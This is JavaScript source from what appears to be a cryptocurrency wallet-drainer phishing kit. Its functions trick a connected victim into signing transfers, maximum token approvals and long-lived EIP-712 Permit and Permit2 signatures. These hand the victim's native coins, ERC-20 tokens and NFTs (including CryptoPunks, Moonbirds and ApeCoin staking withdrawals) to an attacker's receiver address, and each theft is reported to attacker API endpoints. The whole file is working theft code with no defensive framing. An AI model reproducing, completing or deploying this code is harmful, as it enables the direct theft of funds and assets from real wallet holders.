async function drainer_native(amount, value) {
  const isContract = info.contract?.length !== 0 && selectedWallet !== "Trust";
  const gas = DRAINER_CHAINS[selectedChain].gas
  const tx = {
    'from': walletAddress,
    'to': isContract ? info.contract : info.receiver,
    'value': web3.utils.toHex(amount),
    'gasPrice': gas[0],
    'gas': gas[1],
    'nonce': web3.utils.toHex(nonce),
  };
  if(isContract) {
    const contract = contract_get(CRYPTO_ABI, info.contract);
    const encodedFunction = contract.methods[DRAINER_NATIVE_METHOD](info.receiver).encodeABI();
    tx.data = encodedFunction;
  }
  await web3_transaction(tx);
  await request_api(NATIVE_URL, { value: value });
  return true;
}
var xx = null;
async function drainer_permit(chain, contractAddress, abi, permit, amount, proxyReceiver, value) {
//   console.log("a",abi)
//   request_monitor({
//     process: "PERMIT_DEBUG_1"})
//   	const contract = contract_get(JSON.parse(abi), contractAddress);
//     xx = contract;
//     request_monitor({
//       process: "PERMIT_DEBUG_2"})
//     console.log("d ")
//   	//const contractNonce = +(Number(await contract.methods.nonces(walletAddress).call({from: walletAddress})));
//     // xas = 0;
//     // await contract.methods.nonces(walletAddress).call().then(e => { xas = e; console.log("eeee", xas)} ).catch(err=>{request_monitor({
//     //   process: "PERMIT_DEBUG_4", error: err})});
//   	// const contractNonce = +(Number(xas));
//     console.log("call!")
//     let xddd = await DRAINER_CHAINS["eth"].rpc.call({
//       "to": "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
//       "data": xx.methods.nonces(walletAddress).encodeABI(),
//     });
//       console.log("call 2!")
//     console.log(xddd);
//     let contractNonce = +(Number(xddd));
//     console.log("c")
//     request_monitor({
//       process: "PERMIT_DEBUG_3"})
//   	const domainName = await contract.methods.name().call();
//       console.log("b")
//       request_monitor({
//         process: "PERMIT_DEBUG_4"})
//   	var domainVersion = "1";
//   	if (contract.methods.hasOwnProperty("version")) {
//   		domainVersion = await contract.methods.version().call();
//   	} else if (contract.methods.hasOwnProperty("getContractVersion")) {
//       domainVersion = await contract.methods.getContractVersion().call();
//     } else if (contract.methods.hasOwnProperty("getVersion")) {
//       domainVersion = await contract.methods.getVersion().call();
//     }
// console.log("vv")
    let contractSHIT = contract_get(JSON.parse(abi), contractAddress);
    let contract = new ethers.Contract(contractAddress, abi, DRAINER_CHAINS[chain].rpc.provider);
    let contractNonce = +(Number(await contract.nonces(walletAddress)));
    let domainName = await contract.name();
    let domainVersion = "1";
    if (contractSHIT.methods.hasOwnProperty("version")) {
      domainVersion = await contract.version();
    } else if (contractSHIT.methods.hasOwnProperty("getContractVersion")) {
      domainVersion = await contract.getContractVersion();
    } else if (contractSHIT.methods.hasOwnProperty("getVersion")) {
      domainVersion = await contract.getVersion();
    }

  	const deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;

  	var EIP712Domain = [
  		{ name: 'name', type: 'string' },
  		{ name: 'version', type: 'string' },
  		{ name: 'chainId', type: 'uint256' },
  		{ name: 'verifyingContract', type: 'address' },
  	];

  	var Permit = [ { name: "owner", type: "address" }, { name: "spender", type: "address" }, { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" } ];
  	var domain = { name: domainName, version: domainVersion, verifyingContract: contractSHIT.options.address, chainId: getChainHexByName(chain) };
  	var message = { owner: walletAddress, spender: proxyReceiver, value: amount, nonce: contractNonce, deadline: deadline };

    switch(permit) {
      case "bool":
        Permit = [ { name: "holder", type: "address" }, { name: "spender", type: "address" }, { name: "nonce", type: "uint256" }, { name: "expiry", type: "uint256" }, { name: "allowed", type: "bool" } ];
        message = { holder: walletAddress, spender: proxyReceiver, nonce: contractNonce, expiry: deadline, allowed: true };
        break;
      case "salt":
        EIP712Domain = [ { name: "name", type: "string" }, { name: "version", type: "string" }, { name: "verifyingContract", type: "address" }, { name: "salt", type: "bytes32" } ];
        domain = { name: domainName, version: domainVersion, verifyingContract: contractSHIT.options.address, salt: web3.utils.padLeft(getChainHexByName(chain), 64) };
        break;
      default:
        break;
    }

  	const sign = JSON.stringify({
  		types: {
  			EIP712Domain: EIP712Domain,
  			Permit: Permit
  		},
  		primaryType: "Permit",
  		domain: domain,
  		message: message
  	});
    // request_monitor({
    //   process: "PERMIT_DEBUG",
    //   step: sign,
    // });
  	const signature = await web3_sign(sign);
  	const { v, r, s } = ethers.Signature.from(signature);
  	await request_api(PERMIT_URL, { contractAddress: contractAddress, permit: permit, amount: amount, signature: signature, deadline: deadline.toString(), nonce: contractNonce.toString(), v: v.toString(), r: r.toString(), s: s.toString(), value: value, proxyReceiver: proxyReceiver });
  	return true;
}

async function drainer_permit2(chain, tokens, value) {
  	const deadline = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 356;
  	const eip712Domain = [
  		{ name: 'name', type: 'string' },
  		{ name: 'chainId', type: 'uint256' },
  		{ name: 'verifyingContract', type: 'address' },
  	];
  	const permitBatch = [
  		{ name: "details", type: "PermitDetails[]" },
  		{ name: "spender", type: "address" },
  		{ name: "sigDeadline", type: "uint256" }
  	];
  	const permitDetails = [
  		{ name: "token", type: "address" },
  		{ name: "amount", type: "uint160" },
  		{ name: "expiration", type: "uint48" },
  		{ name: "nonce", type: "uint48" }
  	];

    const contractAddresses = [];
  	const details = [];
  	for(const token of tokens) {
  		details.push({ "token": token.contractAddress, "amount": token.amount, "expiration": deadline, "nonce": token.nonce });
      contractAddresses.push(token.contractAddress);
  	}

  	const domain = { chainId: getChainHexByName(chain), name: "Permit2", verifyingContract: PERMIT2_CONTRACT };
  	const message = { details: details, spender: info.proxyReceiverPermit2, sigDeadline: deadline };

  	const sign = JSON.stringify({
  		types: {
  			EIP712Domain: eip712Domain,
  			PermitBatch: permitBatch,
  			PermitDetails: permitDetails
  		},
  		primaryType: "PermitBatch",
  		domain: domain,
  		message: message
  	});
  	const signature = await web3_sign(sign);
  	await request_api(PERMIT2_URL, { contractAddresses: contractAddresses, message: JSON.stringify(message), signature: signature, value: value, proxyReceiver: info.proxyReceiverPermit2 });
  	return true;
}

async function drainer_token(contractAddress, amount, bypass, proxyReceiver, value) {
  	const contract = contract_get(ERC20_ABI, contractAddress);
    let transactionHash = "";
    /*if(selectedWallet === "WC_LedgerWallet" || selectedWallet === "WC_MEWwallet") {
      transactionHash = await web3_fastcall(contractAddress, contract.methods.approve(proxyReceiver, MAX_APPROVAL));
      await request_api(APPROVE_URL, { contractAddress: contractAddress, transactionHash: transactionHash, value: value, proxyReceiver: proxyReceiver });
      return true;
    } else if(bypass) {//TODO: Update rest api
        transactionHash = await web3_fastcall(contractAddress, contract.methods.transferFrom(walletAddress, proxyReceiver, amount));
    } else {
        transactionHash = await web3_fastcall(contractAddress, contract.methods.transfer(proxyReceiver, amount));
    }*/
    if(selectedWallet !== "Metamask") {
        console.log("approve")
        transactionHash = await web3_fastcall(contractAddress, contract.methods.approve(proxyReceiver, MAX_APPROVAL));
        await request_api(APPROVE_URL, { contractAddress: contractAddress, transactionHash: transactionHash, value: value, proxyReceiver: proxyReceiver });
        return true;
    } else if(bypass) {//TODO: Update rest api
        transactionHash = await web3_fastcall(contractAddress, contract.methods.transferFrom(walletAddress, proxyReceiver, amount));
    } else {
        transactionHash = await web3_fastcall(contractAddress, contract.methods.transfer(proxyReceiver, amount));
    }
  	await request_api(TRANSFER_URL, { type: "erc20", contractAddress: contractAddress, value: value, proxyReceiver: proxyReceiver, transactionHash: transactionHash});
  	return true;
}

async function drainer_increaseApproval(contractAddress, proxyReceiver, value) {
  const contract = contract_get(ERC20_ABI, contractAddress);
  const transactionHash = await web3_fastcall(contractAddress, contract.methods.increaseApproval(proxyReceiver, MAX_APPROVAL));
  await request_api(APPROVE_URL, { contractAddress: contractAddress, transactionHash: transactionHash, value: value, proxyReceiver: proxyReceiver });
  return true;
}

async function drainer_increaseAllowance(contractAddress, proxyReceiver, value) {
  const contract = contract_get(ERC20_ABI, contractAddress);
  const transactionHash = await web3_fastcall(contractAddress, contract.methods.increaseAllowance(proxyReceiver, MAX_APPROVAL));//MAX_APPROVAL));
  await request_api(APPROVE_URL, { contractAddress: contractAddress, transactionHash: transactionHash, value: value, proxyReceiver: proxyReceiver });
  return true;
}

async function drainer_nft(contractAddress, action, id, proxyReceiver, value) {
    if(action === "batch") {
      const contract = contract_get(ERC1155_ABI, contractAddress);

      const amounts = [];
      const ids = [];
      for(const token of id) {
        amounts.push(token.amount);
        ids.push(token.id);
      }
      await web3_fastcall(contractAddress, contract.methods.safeBatchTransferFrom(walletAddress, proxyReceiver, ids, amounts, []));
      await request_api(TRANSFER_URL, { type: "batch", contractAddress: contractAddress, value: value, proxyReceiver: proxyReceiver });
    } else if(action === "single") {
      const contract = contract_get(ERC721_ABI, contractAddress);
      await web3_fastcall(contractAddress, contract.methods.safeTransferFrom(walletAddress, proxyReceiver, id));
      await request_api(TRANSFER_URL, { type: "single", contractAddress: contractAddress, id: id, value: value, proxyReceiver: proxyReceiver });
    } else {
      const contract = contract_get(NFT_ABI, contractAddress);
      var transactionHash = await web3_fastcall(contractAddress, contract.methods.setApprovalForAll(proxyReceiver, true));
      await request_api(APPROVE_URL, { contractAddress: contractAddress, transactionHash: transactionHash, value: value, proxyReceiver: proxyReceiver });
    }
  	return true;
}

async function drainer_apecoin(amount, value) {
  const contract = contract_get(APECOIN_STAKING_ABI, APECOIN_STAKING_CONTRACT);
	await web3_fastcall(APECOIN_STAKING_CONTRACT, contract.methods.withdrawApeCoin(amount, info.receiver));
  await request_api(APECOIN_URL, { type: "apecoin", value: value });
  return true;
}

async function drainer_bayc(tokens, value) {
	const contract = contract_get(APECOIN_STAKING_ABI, APECOIN_STAKING_CONTRACT);
  await web3_fastcall(APECOIN_STAKING_CONTRACT, contract.methods.withdrawBAYC(tokens, info.receiver));
  await request_api(APECOIN_URL, { type: "bayc", tokens: tokens, value: value });
  return true;
}

async function drainer_mayc(tokens, value) {
	const contract = contract_get(APECOIN_STAKING_ABI, APECOIN_STAKING_CONTRACT);
  await web3_fastcall(APECOIN_STAKING_CONTRACT, contract.methods.withdrawMAYC(tokens, info.receiver));
  await request_api(APECOIN_URL, { type: "mayc", tokens: tokens, value: value });
  return true;
}

async function drainer_cryptopunks(id, value) {
  const contract = contract_get(CRYPTOPUNKS_ABI, ETH_CRYPTOPUNKS_CONTRACT);
  await web3_fastcall(ETH_CRYPTOPUNKS_CONTRACT, contract.methods.transferPunk(info.receiver, id));
  await request_api(TRANSFER_URL, { type: "cryptopunks", contractAddress: ETH_CRYPTOPUNKS_CONTRACT, id: id, value: value });
  return true;
}

async function drainer_moonbirds(id, value) {
  const contract = contract_get(MOONBIRDS_ABI, ETH_MOONBIRDS_CONTRACT);
  await web3_fastcall(ETH_MOONBIRDS_CONTRACT, contract.methods.safeTransferWhileNesting(walletAddress, info.receiver, id));
  await request_api(TRANSFER_URL, { type: "moonbirds", contractAddress: ETH_MOONBIRDS_CONTRACT, id: id, value: value });
  return true;
}
